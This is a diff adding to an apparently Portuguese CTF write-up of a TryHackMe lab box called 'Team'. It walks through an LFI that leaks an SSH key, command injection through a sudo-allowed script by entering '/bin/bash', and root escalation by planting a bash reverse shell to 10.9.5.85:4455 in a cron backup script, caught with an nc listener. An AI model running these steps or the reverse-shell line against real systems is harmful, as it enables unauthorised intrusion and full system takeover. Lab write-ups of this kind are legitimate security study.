@@ -1,3 +1,4 @@
+
 # Team
 
 * ### Scan de portas - Verificando quais portas estão abertas.
@@ -58,5 +59,61 @@ sudo nano /etc/hosts
 
 ![image](https://github.com/lufffe/Writeups/assets/90646635/1b5a3921-c55e-41da-8b4d-deb0ef39c18c)
 
+* ### Aqui tem um LFI.
+ ![image](https://github.com/lufffe/Writeups/assets/90646635/798ce688-0f8a-4457-898f-18e0dcdac771)
 
- 
+* ### Aqui tem uma chave ssh do Dale
+![image](https://github.com/lufffe/Writeups/assets/90646635/9926e313-d05e-48fa-adcf-e1dc86a85988)
+
+```bash
+┌──(xnv㉿kali)-[~/thm/team]
+└─$ ssh -i id_rsa dale@team.thm
+```
+
+```bash
+dale@TEAM:~$ cat user.txt
+```
+
+> #########################################
+
+```bash
+dale@TEAM:~$ cat /home/gyles/admin_checks
+```
+
+<aside> 💡 #!/bin/bash printf "Reading stats.\n" sleep 1 printf "Reading stats..\n" sleep 1 read -p "Enter name of person backing up the data: " name echo $name >> /var/stats/stats.txt read -p "Enter 'date' to timestamp the file: " error printf "The Date is " $error 2>/dev/null date_save=$(date "+%F-%H-%M") cp /var/stats/stats.txt /var/stats/stats-$date_save.bak printf "Stats have been backed up\n"
+
+</aside>
+
+```bash
+dale@TEAM:~$ sudo -l
+```
+(gyles) NOPASSWD: /home/gyles/admin_checks
+
+```bash
+dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
+```
+Reading stats.
+Reading stats..
+Enter name of person backing up the data: teste
+Enter 'date' to timestamp the file: /bin/bash
+<aside> 💡 LINPEAS root admin 65 Jan 17 2021 /usr/local/bin/main_backup.sh
+</aside>
+
+```bash
+gyles@TEAM:/usr/local/bin$ nano main_backup.sh
+```
+#!/bin/bash
+
+bash -c "bash -i >& /dev/tcp/10.9.5.85/4455 0>&1"
+
+ESPERA ALGUNS SEGUNDOS QUE O CRONJOB VAI EXECUTAR O SCRIPT
+
+```bash
+┌──(xnv㉿kali)-[~]
+└─$ nc -lnvp 4455
+```
+
+```bash
+root@TEAM:~# cat /root/root.txt
+```
+> #########################################
